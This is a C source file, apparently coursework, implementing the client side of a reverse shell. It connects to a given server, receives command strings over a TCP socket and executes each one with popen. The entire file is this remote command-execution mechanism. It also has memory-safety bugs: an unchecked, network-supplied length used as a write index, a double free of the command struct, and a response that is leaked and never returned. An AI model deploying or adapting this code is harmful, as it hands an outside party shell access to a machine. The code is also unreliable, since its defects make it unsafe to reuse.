#include "reverse-shell.h"
#include "client.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <signal.h>

// The only way i could figure out how to quit the program
// was by using signals. When looking up the documentation
// i could not find a way to pass arguments to the signal handler.
// Thats why i store these as global variables.
int client_side_socket;
bool client_is_running = false;

bool handle_command(int server_socket, client_command *cmd);
char* execute_command(client_command *cmd);
void tear_down_client(int signal_nr);

void create_client_socket(const char *server_host, int server_port) {
    printf("Creating client socket at: %s:%d\r\n", server_host, server_port);
    signal(SIGINT, tear_down_client);

    client_side_socket = socket(AF_INET, SOCK_STREAM, 0);
    if(client_side_socket < 0) {
        perror("Error opening client socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in socket_address = {0};
    socket_address.sin_family = AF_INET;
    socket_address.sin_port = htons(server_port);
    socket_address.sin_addr.s_addr = inet_addr(server_host);

    if(connect(client_side_socket, (struct sockaddr *) &socket_address, 
        sizeof(socket_address)) < 0) {
        perror("Error connecting client socket");
        exit(EXIT_FAILURE);
    }

    client_command *cmd = malloc(sizeof(client_command));

    while(true) {
        
        char buf;
        // Check if the server connection has been closed by pining the server.
        if (recv(client_side_socket, &buf, sizeof(buf), MSG_PEEK) == 0) {
            // The server has closed the connection, exit the loop.
            break;
        }

        handle_command(client_side_socket, cmd);
        printf("Received this command: %s\r\n", cmd->command_string);
    }

    free(cmd);
    cmd = NULL;

    if(close(client_side_socket) < 0) {
        perror("Error closing socket");
        exit(EXIT_FAILURE);
    }

    printf("Client shutdown successfully.\r\n");
}

void tear_down_client(int signal_nr) {
    signal(SIGINT, tear_down_client);
    printf("Tearing down client..\r\n");

    if(client_side_socket != 0 && close(client_side_socket) < 0) {
        perror("Error closing client connection");
    }

    printf("Client successfully teared down..\r\n");
}

bool handle_command(int server_socket, client_command *cmd) {
    if(recv(server_socket, &cmd->header, sizeof(cmd->header), 0) == -1) {
        perror("Error reading header"); 
        return false;
    }

    cmd->command_string[cmd->header.command_length] = '\0';
    if(recv(server_socket, cmd->command_string, cmd->header.command_length, 0) == -1) {
        perror("Error reading body");
        free(cmd);
        return false;
    }

    // Check if connection has been closed.
    if (cmd->header.command_length == 0) {
        return false;
    }

    char *response = execute_command(cmd);

    printf("This should be the response: %s\r\n", response);

    return true;
}

// This function is copied from the link below(provided by lecturer), with a few modifictions:
// http://www.eastwill.no/pg3401/eksamen_v23_oppgave5_exec.c
char* execute_command(client_command *cmd) {
   FILE* terminal_stream = NULL;
   char *response = malloc(sizeof(char) * MAX_CLIENT_RESPOSE);
   
   if (response == NULL) 
    return NULL;

   memset(response, 0, MAX_CLIENT_RESPOSE);

   terminal_stream = popen(cmd->command_string, "r");

   if (terminal_stream == NULL) {
      sprintf(response, "Error: Failed to execute command");
   } else {
      if (fgets(response, MAX_CLIENT_RESPOSE - 1, terminal_stream) == NULL)
         sprintf(response, "Error: Failed to read output");

        printf("Wow: %s\r\n", response);
   
      pclose(terminal_stream);
   }

   return response;
}